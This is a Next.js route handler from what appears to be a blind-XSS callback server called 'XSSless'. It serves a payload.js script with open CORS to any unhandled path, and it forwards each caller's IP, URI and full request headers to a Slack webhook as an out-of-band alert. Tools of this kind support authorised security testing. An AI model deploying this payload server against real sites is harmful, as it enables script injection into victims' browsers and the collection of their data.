import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function GET(req: NextRequest) {
  const { pathname } = new URL(req.url);
  
  // Skip if it's a known API endpoint already handled
  const reserved = ['/api/c', '/api/health', '/api/examples', '/api/message'];
  if (reserved.includes(pathname)) {
    return new NextResponse(null, { status: 404 });
  }

  // Generate OOB Callback Alert
  const ip = req.headers.get('x-forwarded-for') || req.headers.get('remote-addr') || 'Unknown';
  let alert = '*XSSless: Out-of-Band Callback Alert*\n';
  alert += `• *IP Address:* \`${ip}\`\n`;
  alert += `• *Request URI:* \`${pathname}\`\n`;

  for (const [key, value] of req.headers.entries()) {
    alert += `• *${key}:* \`${value}\`\n`;
  }

  const slack_webhook = process.env.SLACK_INCOMING_WEBHOOK;
  if (slack_webhook) {
    try {
      await fetch(slack_webhook, {
        method: 'POST',
        body: JSON.stringify({
          username: 'XLess',
          text: alert,
          mrkdwn: true,
        }),
      });
    } catch (e) {
      console.error('Slack alert failed:', e);
    }
  }

  // Serve payload.js
  try {
    const payloadPath = path.join(process.cwd(), 'public', 'payload.js');
    const payloadContent = fs.readFileSync(payloadPath, 'utf8');
    return new NextResponse(payloadContent, {
      headers: {
        'Content-Type': 'application/javascript',
        'Access-Control-Allow-Origin': '*',
      },
    });
  } catch (error) {
    console.error('Error reading payload.js:', error);
    return new NextResponse('console.error("Xless payload not found");', {
      headers: { 'Content-Type': 'application/javascript' }
    });
  }
}
